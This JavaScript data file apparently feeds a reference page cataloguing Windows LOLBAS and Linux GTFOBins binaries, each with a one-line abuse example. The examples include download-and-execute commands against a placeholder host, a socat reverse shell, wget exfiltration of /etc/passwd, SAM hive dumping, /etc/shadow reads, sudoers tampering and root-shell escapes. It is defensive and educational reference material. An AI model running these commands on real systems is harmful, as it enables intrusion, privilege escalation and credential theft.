/*
  LOLBAS — data for lolbas.html

  Living-off-the-land binaries: trusted, signed, already-present binaries that
  can be abused to download, execute, read/write, or bypass controls — so an
  operator needs no custom tooling and defenders see only "legitimate" binaries.
  Windows entries mirror the LOLBAS project; Linux entries mirror GTFOBins.

  Each entry:
    { os: "Windows"|"Linux", bin, functions:[...], desc, example, url }

  Reference / study use. The renderer (lolbas-main.js) filters by OS, by
  function, and by free-text search. Edit this file, not the renderer.
*/
var LOLBAS = {
  meta: {
    title: "Living Off the Land — LOLBAS & GTFOBins",
    note: "Trusted binaries abused for download, execution, read/write and control bypass. Reference only."
  },
  entries: [
    // ---- Windows (LOLBAS) ----
    { os: "Windows", bin: "certutil.exe", functions: ["Download", "Encode"], desc: "Certificate utility abused to download files and base64 decode/encode payloads.", example: "certutil -urlcache -split -f http://host/x x", url: "https://lolbas-project.github.io/lolbas/Binaries/Certutil/" },
    { os: "Windows", bin: "bitsadmin.exe", functions: ["Download", "Execute"], desc: "Background Intelligent Transfer Service client used to fetch and run files.", example: "bitsadmin /transfer j http://host/x %temp%\\x", url: "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/" },
    { os: "Windows", bin: "mshta.exe", functions: ["Execute", "AWL-bypass"], desc: "Runs HTML Applications — executes script, a classic application-allowlist bypass.", example: "mshta http://host/x.hta", url: "https://lolbas-project.github.io/lolbas/Binaries/Mshta/" },
    { os: "Windows", bin: "regsvr32.exe", functions: ["Execute", "AWL-bypass"], desc: "Registers DLLs; the scriptlet (scrobj) technique executes remote script.", example: "regsvr32 /s /u /i:http://host/x.sct scrobj.dll", url: "https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/" },
    { os: "Windows", bin: "rundll32.exe", functions: ["Execute", "AWL-bypass"], desc: "Executes exported DLL functions; abused to run arbitrary code/script.", example: "rundll32 shell32.dll,Control_RunDLL x.dll", url: "https://lolbas-project.github.io/lolbas/Binaries/Rundll32/" },
    { os: "Windows", bin: "msbuild.exe", functions: ["Execute", "AWL-bypass"], desc: "Build engine compiles and runs inline C# tasks from a project file.", example: "msbuild x.csproj", url: "https://lolbas-project.github.io/lolbas/Binaries/Msbuild/" },
    { os: "Windows", bin: "installutil.exe", functions: ["Execute", "AWL-bypass"], desc: ".NET installer utility runs uninstall methods in an assembly.", example: "installutil /logfile= /U x.dll", url: "https://lolbas-project.github.io/lolbas/Binaries/Installutil/" },
    { os: "Windows", bin: "wmic.exe", functions: ["Execute", "Recon"], desc: "WMI command-line; process creation locally/remotely and XSL script exec.", example: "wmic process call create calc", url: "https://lolbas-project.github.io/lolbas/Binaries/Wmic/" },
    { os: "Windows", bin: "mshta/cscript/wscript", functions: ["Execute"], desc: "Windows Script Host runs VBScript/JScript (.vbs/.js) outside the browser.", example: "cscript //nologo x.vbs", url: "https://lolbas-project.github.io/lolbas/Binaries/Cscript/" },
    { os: "Windows", bin: "msiexec.exe", functions: ["Execute", "Download", "AWL-bypass"], desc: "Installs MSI packages, including from a remote URL.", example: "msiexec /q /i http://host/x.msi", url: "https://lolbas-project.github.io/lolbas/Binaries/Msiexec/" },
    { os: "Windows", bin: "cmstp.exe", functions: ["Execute", "AWL-bypass", "UAC-bypass"], desc: "Connection Manager profile installer runs an INF that executes code.", example: "cmstp /s x.inf", url: "https://lolbas-project.github.io/lolbas/Binaries/Cmstp/" },
    { os: "Windows", bin: "odbcconf.exe", functions: ["Execute", "AWL-bypass"], desc: "ODBC config tool loads and runs a DLL via REGSVR action.", example: "odbcconf /a {REGSVR x.dll}", url: "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/" },
    { os: "Windows", bin: "forfiles.exe", functions: ["Execute"], desc: "Iterates files and runs a command — used to launch child processes.", example: "forfiles /p c:\\windows /m notepad.exe /c calc", url: "https://lolbas-project.github.io/lolbas/Binaries/Forfiles/" },
    { os: "Windows", bin: "hh.exe", functions: ["Execute", "Download"], desc: "Compiled HTML Help viewer can run programs and fetch content.", example: "hh http://host/x", url: "https://lolbas-project.github.io/lolbas/Binaries/Hh/" },
    { os: "Windows", bin: "curl.exe", functions: ["Download", "Upload"], desc: "Ships with modern Windows; download or exfiltrate files.", example: "curl http://host/x -o x", url: "https://lolbas-project.github.io/lolbas/Binaries/Curl/" },
    { os: "Windows", bin: "certreq.exe", functions: ["Download", "Upload"], desc: "Certificate request tool abused to POST/GET arbitrary data.", example: "certreq -Post -config http://host/ file", url: "https://lolbas-project.github.io/lolbas/Binaries/Certreq/" },
    { os: "Windows", bin: "ftp.exe", functions: ["Execute", "Download"], desc: "FTP client runs a command script with -s and can shell out.", example: "echo !calc > x & ftp -s:x", url: "https://lolbas-project.github.io/lolbas/Binaries/Ftp/" },
    { os: "Windows", bin: "print.exe", functions: ["Download", "Write"], desc: "Copies a (remote) file to a destination path.", example: "print /D:x.exe http://host/x", url: "https://lolbas-project.github.io/lolbas/Binaries/Print/" },
    { os: "Windows", bin: "powershell.exe", functions: ["Download", "Execute"], desc: "The default scripting host; download-cradle execution. Watch AMSI/logging.", example: "powershell iwr http://host/x -o x", url: "https://lolbas-project.github.io/lolbas/Binaries/Powershell/" },
    { os: "Windows", bin: "reg.exe", functions: ["Read", "Credentials"], desc: "Dump registry hives (SAM/SYSTEM/SECURITY) for offline credential extraction.", example: "reg save hklm\\sam sam.save", url: "https://lolbas-project.github.io/lolbas/Binaries/Reg/" },
    { os: "Windows", bin: "esentutl.exe", functions: ["Read", "Download"], desc: "ESE database utility copies locked files and fetches via UNC.", example: "esentutl /y \\\\host\\s\\x /d x", url: "https://lolbas-project.github.io/lolbas/Binaries/Esentutl/" },
    { os: "Windows", bin: "schtasks.exe", functions: ["Execute", "Persistence"], desc: "Create scheduled tasks for execution and persistence.", example: "schtasks /create /tn x /tr calc /sc onlogon", url: "https://lolbas-project.github.io/lolbas/Binaries/Schtasks/" },
    { os: "Windows", bin: "at.exe / sc.exe", functions: ["Execute", "Persistence"], desc: "Service control / task scheduling used to run code as SYSTEM.", example: "sc create x binpath= \"cmd /c calc\" & sc start x", url: "https://lolbas-project.github.io/lolbas/Binaries/Sc/" },
    { os: "Windows", bin: "wuauclt / various", functions: ["Execute", "AWL-bypass"], desc: "Signed Windows binaries abused to load attacker DLLs.", example: "see LOLBAS for current signed-binary loaders", url: "https://lolbas-project.github.io/" },

    // ---- Linux (GTFOBins) ----
    { os: "Linux", bin: "bash", functions: ["Shell", "Sudo", "SUID"], desc: "If runnable as sudo/SUID, spawns a root shell directly.", example: "sudo bash   |   bash -p", url: "https://gtfobins.github.io/gtfobins/bash/" },
    { os: "Linux", bin: "find", functions: ["Shell", "Sudo", "SUID"], desc: "The -exec action runs commands; a classic root-shell primitive.", example: "find . -exec /bin/sh \\; -quit", url: "https://gtfobins.github.io/gtfobins/find/" },
    { os: "Linux", bin: "vim", functions: ["Shell", "Sudo", "SUID", "Read"], desc: "Editor can run shell commands and read files it should not.", example: ":!/bin/sh   |   :py3 import os;os.execl('/bin/sh','sh','-pc','reset; exec sh -p')", url: "https://gtfobins.github.io/gtfobins/vim/" },
    { os: "Linux", bin: "less / more", functions: ["Shell", "Sudo", "Read"], desc: "Pagers shell out with ! and can read arbitrary files.", example: "less /etc/profile   then   !/bin/sh", url: "https://gtfobins.github.io/gtfobins/less/" },
    { os: "Linux", bin: "awk", functions: ["Shell", "Sudo", "SUID"], desc: "system() runs commands; useful when awk is sudo/SUID.", example: "awk 'BEGIN {system(\"/bin/sh\")}'", url: "https://gtfobins.github.io/gtfobins/awk/" },
    { os: "Linux", bin: "python", functions: ["Shell", "Sudo", "SUID"], desc: "os.system / pty gives a shell; drops privileges correctly with -p tricks.", example: "python3 -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'", url: "https://gtfobins.github.io/gtfobins/python/" },
    { os: "Linux", bin: "perl", functions: ["Shell", "Sudo", "SUID"], desc: "exec() shells out; common on older boxes with SUID perl.", example: "perl -e 'exec \"/bin/sh\";'", url: "https://gtfobins.github.io/gtfobins/perl/" },
    { os: "Linux", bin: "nmap", functions: ["Shell", "Sudo"], desc: "Interactive mode (older versions) runs commands.", example: "nmap --interactive   then   !sh", url: "https://gtfobins.github.io/gtfobins/nmap/" },
    { os: "Linux", bin: "tar", functions: ["Shell", "Sudo"], desc: "Checkpoint actions execute a command mid-archive.", example: "tar cf /dev/null x --checkpoint=1 --checkpoint-action=exec=/bin/sh", url: "https://gtfobins.github.io/gtfobins/tar/" },
    { os: "Linux", bin: "zip", functions: ["Shell", "Sudo"], desc: "The unzip-command option executes on archive events.", example: "zip x.zip f -T --unzip-command='sh -c /bin/sh'", url: "https://gtfobins.github.io/gtfobins/zip/" },
    { os: "Linux", bin: "man", functions: ["Shell", "Sudo"], desc: "Uses a pager; shell out through it.", example: "man man   then   !/bin/sh", url: "https://gtfobins.github.io/gtfobins/man/" },
    { os: "Linux", bin: "env", functions: ["Shell", "Sudo", "SUID"], desc: "Runs an arbitrary program in a modified environment.", example: "env /bin/sh   |   sudo env /bin/sh", url: "https://gtfobins.github.io/gtfobins/env/" },
    { os: "Linux", bin: "cp", functions: ["Write", "Sudo", "SUID"], desc: "Overwrite privileged files (e.g. add a user, replace a binary) when privileged.", example: "sudo cp evil /usr/bin/target", url: "https://gtfobins.github.io/gtfobins/cp/" },
    { os: "Linux", bin: "dd", functions: ["Write", "Read", "Sudo"], desc: "Raw read/write of files and devices with privilege.", example: "dd if=evil of=/etc/passwd", url: "https://gtfobins.github.io/gtfobins/dd/" },
    { os: "Linux", bin: "tee", functions: ["Write", "Sudo"], desc: "Write stdin to a privileged file.", example: "echo 'line' | sudo tee -a /etc/sudoers", url: "https://gtfobins.github.io/gtfobins/tee/" },
    { os: "Linux", bin: "docker", functions: ["Shell", "Sudo", "Escape"], desc: "Membership in the docker group ≈ root — mount the host and chroot.", example: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh", url: "https://gtfobins.github.io/gtfobins/docker/" },
    { os: "Linux", bin: "systemctl", functions: ["Shell", "Sudo", "Persistence"], desc: "Create/run a unit that executes a command as root.", example: "see GTFOBins — write a transient unit and start it", url: "https://gtfobins.github.io/gtfobins/systemctl/" },
    { os: "Linux", bin: "sed", functions: ["Shell", "Sudo", "Read"], desc: "The e command executes; also reads privileged files.", example: "sed -n '1e exec sh 1>&0' /etc/hosts", url: "https://gtfobins.github.io/gtfobins/sed/" },
    { os: "Linux", bin: "nano / ed", functions: ["Shell", "Sudo", "Write"], desc: "Editors shell out and write privileged files.", example: "ed   then   !/bin/sh", url: "https://gtfobins.github.io/gtfobins/ed/" },
    { os: "Linux", bin: "socat", functions: ["Shell", "Transfer"], desc: "Fully interactive reverse shells and file relays.", example: "socat tcp:host:443 exec:'bash -li',pty,stderr,setsid,sane", url: "https://gtfobins.github.io/gtfobins/socat/" },
    { os: "Linux", bin: "wget / curl", functions: ["Download", "Upload"], desc: "Fetch tooling or exfiltrate; wget --post-file uploads.", example: "wget --post-file=/etc/passwd http://host/", url: "https://gtfobins.github.io/gtfobins/wget/" },
    { os: "Linux", bin: "xxd / base64", functions: ["Read", "Encode"], desc: "Read privileged files by dumping and decoding them.", example: "sudo xxd /etc/shadow | xxd -r", url: "https://gtfobins.github.io/gtfobins/xxd/" },
    { os: "Linux", bin: "openssl", functions: ["Transfer", "Read"], desc: "TLS client/server for encrypted transfer and reading files.", example: "openssl enc -in /etc/shadow", url: "https://gtfobins.github.io/gtfobins/openssl/" }
  ]
};
